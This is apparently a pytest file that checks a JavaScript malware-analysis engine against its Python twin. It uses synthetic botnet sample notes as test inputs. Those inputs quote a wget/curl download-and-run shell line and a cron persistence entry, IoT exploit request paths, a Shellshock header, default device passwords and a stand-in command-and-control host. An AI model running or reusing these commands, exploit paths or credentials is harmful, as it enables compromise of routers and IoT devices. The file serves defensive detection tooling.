"""The GitHub Pages build (docs/engine.js) must produce exactly the same
framework as the Python engine. Needs Node.js; skipped if it is not installed."""

import json
import re
import shutil
import subprocess
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from engine import generate  # noqa: E402
from engine.render import to_markdown  # noqa: E402

# Synthetic inputs that exercise most rules (not real sample data).
CASES = {
    "gpon_worm": ("""SHA256 (sample): 1111111111111111111111111111111111111111111111111111111111111111
SHA256 (archive): 2222222222222222222222222222222222222222222222222222222222222222
File size: 568,424 bytes
ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, stripped
  Entry point address:               0x106d0
cd /tmp||cd /;wget -qO- http://198.51.99.7/payload_v3.sh|sh||curl -fsSL http://198.51.99.7/payload_v3.sh|sh
*/5 * * * * wget -qO- http://198.51.99.7/payload_v3.sh | sh
/var/spool/cron/crontabs/root
POST /GponForm/diag_Form?images/ HTTP/1.1
POST /ctrlt/DeviceUpgrade_1 HTTP/1.1
GET /picsdesc.xml HTTP/1.1
POST /mgmt/tm/util/bash HTTP/1.1
POST /tmUnblock.cgi HTTP/1.1
User-Agent: () { :; }; %s
root admin root1234 smcadmin 7ujMko0admin klv123
pkill -9 -f mirai >/dev/null 2>&1""",
                  """Cloud sandbox (any.run, Ubuntu 22.04 x64):
- Executed via nautilus, locale-check child process observed.
- connections to 185.125.190.57:123 and 91.189.91.58:80 only, none to 198.51.99.7
- Network Threats: 0, reachability check likely failed""", {"name": "GPON worm"}),
    "telnet_bot": ("""ELF 32-bit LSB executable, ARM, statically linked, not stripped
telnet_scanner killer_loop l4resattack SendUDP install_persistence
45.9.20.10:55487
/etc/init.d/S99bot /etc/systemd/system/bot.service /root/.bashrc /tmp/.kworker
root/xc3511 root/vizxv
history -c""", "Local emulation (qemu-arm-static):\n- host instability from scanning\nHost 10.0.0.4", {}),
    "android": ("""ELF 32-bit LSB pie executable, ARM, dynamically linked, interpreter /system/bin/linker, stripped
socket, bind, connect, accept, listen, fork, setsid, prctl, execl, system, opendir, readdir, dlopen, uname
/data/local/tmp/ android-tv-sysboot android-tv-emu high-entropy .rodata""", "", {}),
    "edge": ("""MD5: 5f4dcc3b5aa765d61d8327deb882cf99
ELF 64-bit MSB executable, MIPS, statically linked, stripped, BuildID[sha1]=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
UPX! packed, C2 evil-botnet.xyz, wget http://45.9.20.10:8080/bins/mips
CVE-2018-10562 gafgyt""", "", {"c2": "203.0.113.5", "arch": "MIPS", "family": "Gafgyt",
                                "exploit_url": "POST /GponForm/diag_Form?images/"}),
    "empty": ("", "", {}),
}

JS = r"""
const E = require(process.argv[1]);  // `node -e` puts the first argument at argv[1]
const cases = JSON.parse(require('fs').readFileSync(0, 'utf8'));
const out = {};
for (const [id, [s, d, m]] of Object.entries(cases)) {
  const fw = E.generate(s, d, m); fw.meta.generated_at = 'FIXED'; fw.markdown = E.toMarkdown(fw); out[id] = fw;
}
process.stdout.write(JSON.stringify(out));
"""


def _norm(fw):
    strip = lambda s: re.sub(r'date = "[^"]*"', "date", s)
    fw["detections"]["yara"] = strip(fw["detections"]["yara"])
    fw["markdown"] = strip(fw["markdown"])
    return json.loads(json.dumps(fw, sort_keys=True))


@pytest.mark.skipif(not shutil.which("node"), reason="Node.js not installed")
def test_js_engine_matches_python():
    res = subprocess.run(["node", "-e", JS, str(ROOT / "docs" / "engine.js")],
                         input=json.dumps(CASES), capture_output=True, text=True, encoding="utf-8", check=True)
    js = json.loads(res.stdout)
    for cid, (s, d, m) in CASES.items():
        fw = generate(s, d, m)
        fw["meta"]["generated_at"] = "FIXED"
        fw["markdown"] = to_markdown(fw)
        assert _norm(fw) == _norm(js[cid]), f"Python/JS mismatch for case {cid!r}"


def test_rules_js_is_up_to_date():
    """docs/rules.js must be regenerated after editing engine/rules.py."""
    before = (ROOT / "docs" / "rules.js").read_text(encoding="utf-8")
    subprocess.run([sys.executable, str(ROOT / "tools" / "export_rules.py")], check=True, capture_output=True)
    assert (ROOT / "docs" / "rules.js").read_text(encoding="utf-8") == before, \
        "docs/rules.js was stale - it has now been regenerated, commit it"
